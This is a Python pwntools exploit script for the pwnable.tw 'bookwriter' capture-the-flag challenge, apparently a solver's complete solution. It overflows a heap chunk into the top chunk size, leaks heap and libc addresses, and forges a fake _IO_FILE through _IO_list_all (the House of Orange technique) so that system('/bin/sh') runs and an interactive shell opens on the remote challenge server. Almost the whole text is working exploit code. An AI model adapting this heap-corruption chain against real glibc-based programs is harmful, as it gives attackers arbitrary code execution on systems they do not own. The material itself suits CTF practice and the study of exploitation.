from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pwnabletw_bookwriter")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./pwnabletw_bookwriter")
else:
	p = remote("chall.pwnable.tw","10304")
	libc = ELF("./libc_64.so.6")
	elf = ELF("./pwnabletw_bookwriter")

def author(name):
	p.sendafter("Author :",name)

def add(size,content):
	p.sendafter("Your choice :","1")
	p.sendafter("page :",str(size))
	p.sendafter("Content :",content)
	#p.recvuntil("Done !\n")

def show(index):
	p.sendafter("Your choice :","2")
	p.sendafter("Index of page :",str(index))

def edit(index,content):
	p.sendafter("Your choice :","3")
	p.sendafter("page :",str(index))
	p.sendafter("Content:",content)
	p.recvuntil("Done !\n")

def info(change = False,name = ""):
	p.sendafter("Your choice :","4")
	if change:
		p.sendlineafter("(yes:1 / no:0) ","1")
		author(name)
	else:
		p.sendlineafter("(yes:1 / no:0) ","0")

def debugf():
	gdb.attach(p,"b *0x400CEE")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
author("aa")
size = 0x18
add(size,"a"*size) #0
edit(0,"a"*size)
heap_point = 0x6020a0
payload = "a"*size + "\xe1\x0f\x00"
edit(0,payload)
add(0x1000,"a") #1
add(0x300,"a"*0x18) #2
show(2)
p.recvuntil("a"*0x18)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
heap_base = leak_addr - 0x20
log.success("heap_base:" + hex(heap_base))
add(0x30,"b"*0x8)
show(3)
p.recvuntil("b"*0x8)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
for i in range(4):
	add(0x30,"junk")
edit(0,"\x00")
#debugf()
add(0x30,"junk")
_IO_list_all = libc.symbols["_IO_list_all"]
payload = "\x00"*0x18
payload += p64(0x311)
payload += "\x00"*0x300
payload += (p64(0) + p64(0x41) + p64(0)*6) * 6
payload += ("/bin/sh\x00" + p64(0x61) + p64(heap_base) + p64(_IO_list_all - 0x10) + p64(0) + p64(1)).ljust(0xd8,"\x00")
payload += p64(heap_base + 0x590)
one_gadget = libc.address + 0x45216
payload += p64(0)*3 + p64(libc.symbols["system"])
edit(0,payload)
#add(0x80,"junk")
p.sendafter("Your choice :","1")
p.sendafter("page :",str(0x80))
p.interactive()
